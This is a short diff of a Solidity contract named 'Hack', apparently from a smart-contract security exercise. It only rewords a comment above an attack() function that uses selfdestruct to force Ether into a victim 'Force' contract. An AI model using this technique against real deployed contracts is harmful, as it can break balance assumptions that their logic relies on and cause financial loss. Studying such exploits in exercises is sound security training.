@@ -22,7 +22,7 @@ contract Hack{
         force = Force(payable(_victim));
     }
 
-    // This is the function, and look the address must be always a payable one
+    // This is the attack function, and make sure it be payable
     function attack() external payable{
         selfdestruct(payable(address(force)));
     }
